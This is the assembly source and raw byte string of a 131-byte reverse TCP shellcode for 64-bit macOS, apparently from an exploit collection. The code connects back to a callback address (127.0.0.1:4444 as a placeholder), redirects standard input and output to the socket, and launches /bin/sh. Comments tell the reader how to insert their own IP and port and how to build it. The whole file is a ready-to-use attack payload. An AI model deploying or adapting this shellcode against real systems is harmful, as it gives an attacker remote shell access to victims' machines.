
true :; ./sct_x86-64_Darwin -f <(printf 'A\xb0\x02I\xc1\xe0\x18I\x83\xc8aL\x89\xc0H1\xd2H\x89\xd6H\xff\xc6H\x89\xf7H\xff\xc7\x0f\x05I\x89\xc4I\xbd\x01\x01\x11\\\x7f\x00\x00\x01M1\xc9A\xb1\xffM)\xcdAUI\x89\xe5I\xff\xc0L\x89\xc0L\x89\xe7L\x89\xeeH\x83\xc2\x10\x0f\x05I\x83\xe8\x08H1\xf6L\x89\xc0L\x89\xe7\x0f\x05H\x83\xfe\x02H\xff\xc6v\xefI\x83\xe8\x1fL\x89\xc0H1\xd2I\xbd\xff/bin/shI\xc1\xed\x08AUH\x89\xe7H1\xf6\x0f\x05') ; exit
 
;osx x64 reverse tcp shellcode (131 bytes)
;Jacob Hammack
;jacob.hammack@hammackj.com
;http://www.hammackj.com
;
;props to http://www.thexploit.com/ for the blog posts on x64 osx asm
;I borrowed some of his code
;
 
;#OSX reverse tcp shell (131 bytes)
;#replace 7F000001 around byte 43 with the call back ip in hex
;#replace 5C11 around byte 39 with a new port current is 4444

;nasm -f macho reverse_tcp.s -o reverse_tcp.o
;ld -o reverse_tcp -e start reverse_tcp.o
 
BITS 64
 
section .text
global start
 
start:
  mov r8b, 0x02               ; unix class system calls = 2
  shl r8, 24                  ; shift left 24 to the upper order bits
  or r8, 0x61                 ; socket is 0x61
  mov rax, r8                 ; put socket syscall # into rax
 
;Socket
  xor rdx, rdx                ; zero out rdx
  mov rsi, rdx                ; AF_NET = 1
  inc rsi                     ; rsi = AF_NET
  mov rdi, rsi                ; SOCK_STREAM = 2
  inc rdi                     ; rdi = SOCK_STREAM
  syscall                     ; call socket(SOCK_STREAM, AF_NET, 0);
 
  mov r12, rax                ; Save the socket
 
;Sock_addr
  mov r13, 0x0100007F5C110101 ; IP = 127.0.0.1, Port = 5C11(4444)
  xor r9, r9
  mov r9b, 0xFF               ; The sock_addr_in is + FF from where we need it
  sub r13, r9                 ; So we sub 0xFF from it to get the correct value and avoid a null
  push r13                    ; Push it on the stack
  mov r13, rsp                ; Save the sock_addr_in into r13
 
;Connect
  inc r8                      ; Connect = 0x62, so we inc by one from the previous syscall
  mov rax, r8                 ; move that into rax
  mov rdi, r12                ; move the saved socket fd into rdi
  mov rsi, r13                ; move the saved sock_addr_in into rsi
  add rdx, 0x10               ; add 0x10 to rdx
  syscall                     ; call connect(rdi, rsi, rdx)
 
  sub r8, 0x8                 ; subtract 8 from r8 for the next syscall dup2 0x90
  xor rsi, rsi                ; zero out rsi
 
dup:
  mov rax, r8                 ; move the syscall for dup2 into rax
  mov rdi, r12                ; move the FD for the socket into rdi
  syscall                     ; call dup2(rdi, rsi)
 
  cmp rsi, 0x2                ; check to see if we are still under 2
  inc rsi                     ; inc rsi
  jbe dup                     ; jmp if less than 2
 
  sub r8, 0x1F                ; setup the exec syscall at 0x3b
  mov rax, r8                 ; move the syscall into rax
 
;exec
  xor rdx, rdx                ; zero out rdx
  mov r13, 0x68732f6e69622fFF ; '/bin/sh' in hex
  shr r13, 8                  ; shift right to create the null terminator
  push r13                    ; push to the stack
  mov rdi, rsp                ; move the command from the stack to rdi
  xor rsi, rsi                ; zero out rsi
  syscall                     ; call exec(rdi, 0, 0)
